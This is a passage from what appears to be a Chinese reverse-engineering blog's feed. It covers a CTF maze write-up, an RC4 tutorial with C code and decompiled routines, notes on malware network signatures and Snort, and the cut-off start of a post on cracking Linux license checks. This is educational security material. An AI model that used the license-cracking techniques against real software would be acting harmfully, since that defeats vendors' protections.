)</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](&amp;v12, i);</span><br><span class="line">    if ( v5 == &apos;d&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &gt; &apos;d&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 == &apos;s&apos; )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 += 9;</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v5 == &apos;w&apos; )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 -= 9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 == &apos;a&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      --v10;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由上下换行加减9可以判断出，<strong>map每行9个字符</strong>，于是得到map</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oooo*oooo</span><br><span class="line">oxxxxoxxo</span><br><span class="line">oxooooxoo</span><br><span class="line">oxxoxxxoo</span><br><span class="line">ooxxxooxo</span><br><span class="line">oooxooxxo</span><br><span class="line">oooxxxoxo</span><br><span class="line">oooxoxxxx</span><br><span class="line">oooooooox</span><br></pre></td></tr></table></figure><p>判定边界o<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](&amp;map, v10) == &apos;o&apos; )</span><br><span class="line">  break;</span><br></pre></td></tr></table></figure></p><p>到达终点<em><br>`if ( </em>(_BYTE <em>)std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::operator<a href="&amp;map, v10"></a> == ‘</char></char></em>‘ )`</p><p>v10原值为80，从0开始为第81位，于是从最后一个x出发，到达最上面*<br>走的步骤为<br><code>waaawaawwawawwdddw</code></p><p>刚好18位，运行程序，输入步骤，拿到flag</p><p><img src="https://i.loli.net/2018/10/07/5bb97f0197437.jpg" alt=""></p><p>From <a href="https://kabeor.github.io/SUS十一欢乐赛 re200 maze/">https://kabeor.github.io/SUS十一欢乐赛 re200 maze/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SUS十一欢乐赛-re200-maze&quot;&gt;&lt;a href=&quot;#SUS十一欢乐赛-re200-maze&quot; class=&quot;headerlink&quot; title=&quot;SUS十一欢乐赛 re200 maze&quot;&gt;&lt;/a&gt;SUS十一欢乐赛 re200 maze&lt;/h1&gt;&lt;p&gt;&lt;i
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>RC4加密算法及逆向方法初探</title>
    <link href="https://kabeor.github.io/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/RC4加密算法及逆向方法初探/</id>
    <published>2018-09-24T03:28:51.989Z</published>
    <updated>2018-09-24T07:13:36.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RC4加密算法及逆向方法初探"><a href="#RC4加密算法及逆向方法初探" class="headerlink" title="RC4加密算法及逆向方法初探"></a>RC4加密算法及逆向方法初探</h1><p>看来可以写一个系列了</p><p>之前的两篇</p><p><a href="https://kabeor.cn/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">CRC校验算法及逆向方法初探</a></p><p><a href="https://kabeor.cn/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">Base-N算法及逆向初探</a></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 —-wiki <a href="https://zh.wikipedia.org/zh-hans/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/RC4</a></p><h3 id="加密-解密-原理"><a href="#加密-解密-原理" class="headerlink" title="加密(解密)原理"></a>加密(解密)原理</h3><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p></blockquote><p><strong>由于异或运算的对合性，RC4加密解密使用同一套算法。</strong></p><h3 id="C代码表示"><a href="#C代码表示" class="headerlink" title="C代码表示"></a>C代码表示</h3><p>先来看内部的几个基本变量</p><ol><li><p>S-Box 也就是所谓的S盒，是一个256长度的char型数组，每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换。</p></li><li><p>密钥K char key[256] 密钥的长度keylen与明文长度、密钥流的长度没有必然关系</p></li><li>临时向量k 长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将密钥的每个字节赋给k</li></ol><h4 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h4><blockquote><p>包含三个参数</p><p>参数1是一个256长度的char型数组，定义为: unsigned char sBox[256];</p><p>参数2是密钥，其内容可以随便定义：char key[256];</p><p>参数3是密钥的长度，Len = strlen(key);</p></blockquote><p>初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。</p><p>i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的。</p><p><img src="https://i.loli.net/2018/09/24/5ba8681ba7c54.jpg" alt=""></p><p><img src="https://i.loli.net/2018/09/24/5ba8682730f8d.jpg" alt=""></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2. 加解密"></a>2. 加解密</h4><blockquote><p>包含三个参数</p><p>参数1是上边rc4_init函数中，被搅乱的S-box;</p><p>参数2是需要加密的数据data;</p><p>参数3是data的长度.</p></blockquote><p>每收到一个字节，就进行while循环。通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</p><p><img src="https://i.loli.net/2018/09/24/5ba8683b7feb5.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *Data,<span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-主函数"><a href="#3-主函数" class="headerlink" title="3. 主函数"></a>3. 主函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">"justfortest"</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"这是一个用来加密的数据Data"</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"key=%s,length=%d\n\n"</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key)); <span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"完成对S[i]的初始化，如下：\n\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02X"</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)           <span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经初始化，现在加密:\n\n"</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>拿今年九月安恒杯 NewDriver这道来看</p><p>栈平衡一下，然后f5</p><p><img src="https://i.loli.net/2018/09/24/5ba880432dd93.jpg" alt=""></p><p>限制输入33位<br>base64加密<br>rc4加密</p><p>base64改了密码表，但结构很清晰，具体识别方法看我上一篇</p><p>rc4共有两个函数 sub_E41000,sub_E410E0<br>下面来具体分析这两个函数，具体解释都放在图里了，看图即可。</p><h3 id="sub-E41000-初始化"><a href="#sub-E41000-初始化" class="headerlink" title="sub_E41000 初始化"></a>sub_E41000 初始化</h3><p>函数头如下，三个值<br><code>sub_E41000(&amp;v6, &amp;v10, strlen(&amp;v10));</code><br>对应上面源码<br><code>void rc4_init(unsigned char *s,unsigned char *key, unsigned long Len)</code></p><h4 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h4><p><img src="https://i.loli.net/2018/09/24/5ba88343732b6.jpg" alt=""></p><h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p>将0到255的互不重复的元素装入S盒</p><p><img src="https://i.loli.net/2018/09/24/5ba88746b7e93.jpg" alt=""></p><p>打乱S盒</p><p><img src="https://i.loli.net/2018/09/24/5ba8885101b9f.jpg" alt=""></p><h3 id="sub-E410E0-加密"><a href="#sub-E410E0-加密" class="headerlink" title="sub_E410E0 加密"></a>sub_E410E0 加密</h3><p><code>sub_E410E0(&amp;v6, v3, strlen(v3));</code><br>对应上面源码<br><code>void rc4_crypt(unsigned char *s,unsigned char *Data,unsigned long Len)</code></p><h4 id="伪代码-1"><a href="#伪代码-1" class="headerlink" title="伪代码"></a>伪代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_E410E0@&lt;eax&gt;(<span class="keyword">int</span> result@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">      v6 = *(v3 + result);</span><br><span class="line">      v4 = (v6 + v4) % <span class="number">256</span>;</span><br><span class="line">      *(v3 + result) = *(v4 + result);</span><br><span class="line">      *(v4 + result) = v6;</span><br><span class="line">      *(v5++ + a2) ^= *((v6 + *(v3 + result)) % <span class="number">256</span> + result);  <span class="comment">//   Data[k]^=s[t];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; a3 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪代码看的就很清晰了，IDA分析时将数组按指针形式显示</p><h4 id="反汇编-1"><a href="#反汇编-1" class="headerlink" title="反汇编"></a>反汇编</h4><p><img src="https://i.loli.net/2018/09/24/5ba889f6b7478.jpg" alt=""></p><p><img src="https://i.loli.net/2018/09/24/5ba88a3f95be8.jpg" alt=""></p><p>0FFFFFF00h取负就是256</p><h2 id="魔改RC4"><a href="#魔改RC4" class="headerlink" title="魔改RC4"></a>魔改RC4</h2><p>其实RC4魔改还是比较难的，稍有改变，整个算法就完全不同了。因此，大多数赛题将rc4与其他算法进行组合来加密flag</p><p>常见变化位置</p><ol><li>密钥经过上一步的其他加密后传入</li><li>s盒内部数据固定</li><li>rc4加密后数据进行重加密</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人感觉rc4重点理解算法即可，并且对内部多次限制256次循环，mod256，以及对数据strlen的读取的特点注意即可</p><hr><p>参考网址：<br><a href="https://zh.wikipedia.org/zh-hans/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/RC4</a><br><a href="https://zh.wikipedia.org/wiki/S%E7%9B%92" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/S%E7%9B%92</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/</a></p><p>From <a href="https://kabeor.github.io/RC4加密算法及逆向方法初探/">https://kabeor.github.io/RC4加密算法及逆向方法初探/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RC4加密算法及逆向方法初探&quot;&gt;&lt;a href=&quot;#RC4加密算法及逆向方法初探&quot; class=&quot;headerlink&quot; title=&quot;RC4加密算法及逆向方法初探&quot;&gt;&lt;/a&gt;RC4加密算法及逆向方法初探&lt;/h1&gt;&lt;p&gt;看来可以写一个系列了&lt;/p&gt;
&lt;p&gt;之前的两
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第14章  恶意代码的网络特征</title>
    <link href="https://kabeor.github.io/%E7%AC%AC14%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/"/>
    <id>https://kabeor.github.io/第14章  恶意代码的网络特征/</id>
    <published>2018-09-22T13:04:32.171Z</published>
    <updated>2018-09-23T09:28:41.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第14章-恶意代码的网络特征"><a href="#第14章-恶意代码的网络特征" class="headerlink" title="第14章  恶意代码的网络特征"></a>第14章  恶意代码的网络特征</h1><h2 id="1-网络应对措施"><a href="#1-网络应对措施" class="headerlink" title="1. 网络应对措施"></a>1. 网络应对措施</h2><p>网络行为的基本属性包括IP地址、TCP与UDP端口、域名，以及流量内容等，网络和安全设备可以利用它们，来提供网络应对措施。根据IP地址和端口，防火墙和路由器可以限制对网络的访问。</p><p>配置DNS服务器，可以将一个已知的恶意域名重定向到内部主机，这被称为sinkhole技术。配置代理服务器，可以检测或者阻止访问某些域名。</p><h3 id="在原始环境中观察代码"><a href="#在原始环境中观察代码" class="headerlink" title="在原始环境中观察代码"></a>在原始环境中观察代码</h3><blockquote><p>真实环境捕获的信息将提供恶意应用程序真实行为的最佳视图，而恶意代码可以被编程，以加入探测实验环境的能力。</p><p>活跃恶意代码的真实场景信息能够提供独特的视角，来加快分析过程。真实流量提供了恶意代码在两个端点（客户端和服务器端）之间的通信信息，然而，在实验环境里，分析者通常只能获取其中一端的信息。而分析恶意代码如何接收内容（也就是解析例程），比起分析恶意代码如何产生内容，往往会更具挑战性。因此，双向的样本流量可以帮助分析师加快恶意代码解析例程的分析进度。</p><p>此外，当你被动地查看信息时，不存在泄露给攻击者分析活动的风险。</p></blockquote><h3 id="恶意行为的痕迹"><a href="#恶意行为的痕迹" class="headerlink" title="恶意行为的痕迹"></a>恶意行为的痕迹</h3><h3 id="OPSEC-操作安全性"><a href="#OPSEC-操作安全性" class="headerlink" title="OPSEC=操作安全性"></a>OPSEC=操作安全性</h3><p>OPSEC是政府和军方的一个术语，用来描述防止敌方获取敏感信息的过程。</p><h2 id="2-安全地调查在线攻击者"><a href="#2-安全地调查在线攻击者" class="headerlink" title="2.安全地调查在线攻击者"></a>2.安全地调查在线攻击者</h2><h3 id="间接性策略"><a href="#间接性策略" class="headerlink" title="间接性策略"></a>间接性策略</h3><p>一种间接策略是使用某些旨在提供匿名的服务或者机制，例如Tor，一个开放的代理，或者基于Web的匿名器。</p><p>另一种策略是使用专门的机器来研究，通常是虚拟机。</p><p>隐藏专用机器的具体位置的方法</p><ol><li>使用匿名的蜂窝连接。</li><li>通过安全shell（SSH）或者一个虚拟私有网络（VPN），将你的连接通过远程的基础设施来进行隧道传输。</li><li>使用运行在云服务中的一个临时远程机器，例如亚马逊的弹性计算云（亚马逊EC2）。</li></ol><h3 id="获取IP地址和域名信息"><a href="#获取IP地址和域名信息" class="headerlink" title="获取IP地址和域名信息"></a>获取IP地址和域名信息</h3><blockquote><p>Domain Tools（<a href="http://www.domaintools.com/）" target="_blank" rel="noopener">http://www.domaintools.com/）</a></p></blockquote><p>这个网站提供了whois历史记录的查询，能够进行反向IP查询，来显示所有解析成某个特定IP地址的域名，以及反向whois查询。反向whois查询允许基于联系人信息的元数据，来进行whois记录查询。</p><blockquote><p>RobTex（http:/www.robtex.com/）</p></blockquote><p>这个网站能提供指向单个IP地址的多个域名信息，另外也集成其他一些有价值的信息</p><blockquote><p>BFK DNS logger（<a href="http://www.bfk.de/bfk_dnslogger_en.htm/）" target="_blank" rel="noopener">http://www.bfk.de/bfk_dnslogger_en.htm/）</a></p></blockquote><p>这个网站使用被动DNS监测信息。</p><h2 id="3-基于内容的网络应对措施"><a href="#3-基于内容的网络应对措施" class="headerlink" title="3. 基于内容的网络应对措施"></a>3. 基于内容的网络应对措施</h2><h3 id="使用Snort进行入侵检测"><a href="#使用Snort进行入侵检测" class="headerlink" title="使用Snort进行入侵检测"></a>使用Snort进行入侵检测</h3><p>Snort是最流行的入侵检测系统之一。Snort被用来生成网络特征或者规则，这些规则由一系列元素（被称作是规则选项）连接在一起，而只有这些元素均为真时，规则才会被触发。主要的规则选项被分为：识别内容元素的规则选项（在Snort系统术语中被称为负载规则选项），以及内容无关的规则选项（称作非负载规则选项）。非负载规则选项的例子中包括某些特定标志位，TCP或IP头中的特定值，以及包负载的大小。</p><blockquote><p>Snort规则关键字描述</p></blockquote><p><img src="https://i.loli.net/2018/09/23/5ba7513ac3cdd.jpg" alt=""></p><h3 id="深入观察"><a href="#深入观察" class="headerlink" title="深入观察"></a>深入观察</h3><p><img src="https://i.loli.net/2018/09/23/5ba751667c26b.jpg" alt=""></p><h2 id="4-结合动态和静态分析技术"><a href="#4-结合动态和静态分析技术" class="headerlink" title="4. 结合动态和静态分析技术"></a>4. 结合动态和静态分析技术</h2><h3 id="过度分析的危险"><a href="#过度分析的危险" class="headerlink" title="过度分析的危险"></a>过度分析的危险</h3><blockquote><p>恶意代码分析深入级别</p></blockquote><p><img src="https://i.loli.net/2018/09/23/5ba7522329dfb.jpg" alt=""></p><h3 id="在众目睽睽下隐藏"><a href="#在众目睽睽下隐藏" class="headerlink" title="在众目睽睽下隐藏"></a>在众目睽睽下隐藏</h3><ol><li>攻击者模拟现有的协议</li><li>攻击者利用现有的基础设施</li><li>利用客户端发出的信令</li></ol><h3 id="理解周边代码"><a href="#理解周边代码" class="headerlink" title="理解周边代码"></a>理解周边代码</h3><p>网络行为有两种类型：发送数据和接收数据。分析发送出去的数据通常比较容易，因为无论恶意代码何时运行，它都会产生出便于分析的样本。</p><h3 id="寻找网络操作代码"><a href="#寻找网络操作代码" class="headerlink" title="寻找网络操作代码"></a>寻找网络操作代码</h3><p><img src="https://i.loli.net/2018/09/23/5ba7536b5bb82.jpg" alt=""></p><h3 id="了解网络内容的来源"><a href="#了解网络内容的来源" class="headerlink" title="了解网络内容的来源"></a>了解网络内容的来源</h3><p>特征生成中最有价值的元素是恶意代码中的硬编码数据。恶意代码发送的网络流量是从一组有限数据源中构造的。创建出有效特征，需要对每一块网络内容的数据来源有所了解。</p><p>下面是一些基本的数据源：</p><ol><li>随机数据（例如调用生成伪随机值函数所返回的数据）。</li><li>来源于标准网络库的数据（例如调用HTTPSendRequest创建的GET请求）。</li><li>来源于恶意代码的硬编码数据（例如一个硬编码的User-Agent字符串）。</li><li>关于主机及其配置信息的数据（例如主机名，根据系统时钟的当前时间、CPU速率等）。</li><li>从其他来源接收的数据，例如远程服务器或者文件系统（例如，服务器发送的用于加密的随机数、本地文件，以及键盘记录器捕获信息等）。</li></ol><h3 id="硬编码数据-vs-临时数据"><a href="#硬编码数据-vs-临时数据" class="headerlink" title="硬编码数据 vs. 临时数据"></a>硬编码数据 vs. 临时数据</h3><p>与使用高层网络API（如COM接口）相比，恶意代码使用低层网络API（如Winsock）时，需要更多手动生成的内容来模仿常见流量。更多的手动生成内容就意味着更多的硬编码数据，从而增加了恶意代码编写者犯错误的可能性，你可以利用这些错误来生成网络特征。</p><h3 id="确定和利用编码步骤"><a href="#确定和利用编码步骤" class="headerlink" title="确定和利用编码步骤"></a>确定和利用编码步骤</h3><h3 id="创建特征"><a href="#创建特征" class="headerlink" title="创建特征"></a>创建特征</h3><h3 id="分析解析例程"><a href="#分析解析例程" class="headerlink" title="分析解析例程"></a>分析解析例程</h3><h3 id="针对多个元素"><a href="#针对多个元素" class="headerlink" title="针对多个元素"></a>针对多个元素</h3><h2 id="5-了解攻击者的意图"><a href="#5-了解攻击者的意图" class="headerlink" title="5. 了解攻击者的意图"></a>5. 了解攻击者的意图</h2><blockquote><p>利用攻击者的弱点</p></blockquote><ol><li>专注属于两端之间的协议元素</li><li>专注于已知的任何协议元素作为密钥的部分</li><li>确定流量中不太明显的协议元素</li></ol><p>From <a href="https://kabeor.github.io/第14章  恶意代码的网络特征/">https://kabeor.github.io/第14章  恶意代码的网络特征/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第14章-恶意代码的网络特征&quot;&gt;&lt;a href=&quot;#第14章-恶意代码的网络特征&quot; class=&quot;headerlink&quot; title=&quot;第14章  恶意代码的网络特征&quot;&gt;&lt;/a&gt;第14章  恶意代码的网络特征&lt;/h1&gt;&lt;h2 id=&quot;1-网络应对措施&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux程序破解与反破解</title>
    <link href="https://kabeor.github.io/Linux%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%8F%8D%E7%A0%B4%E8%A7%A3/"/>
    <id>https://kabeor.github.io/Linux程序破解与反破解/</id>
    <published>2018-09-15T14:54:44.059Z</published>
    <updated>2018-09-15T14:57:21.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux程序破解与反破解"><a href="#Linux程序破解与反破解" class="headerlink" title="Linux程序破解与反破解"></a>Linux程序破解与反破解</h1><h2 id="1-许可证密钥位于二进制文件内"><a href="#1-许可证密钥位于二进制文件内" class="headerlink" title="1. 许可证密钥位于二进制文件内"></a>1. 许可证密钥位于二进制文件内</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>c</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc==<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span 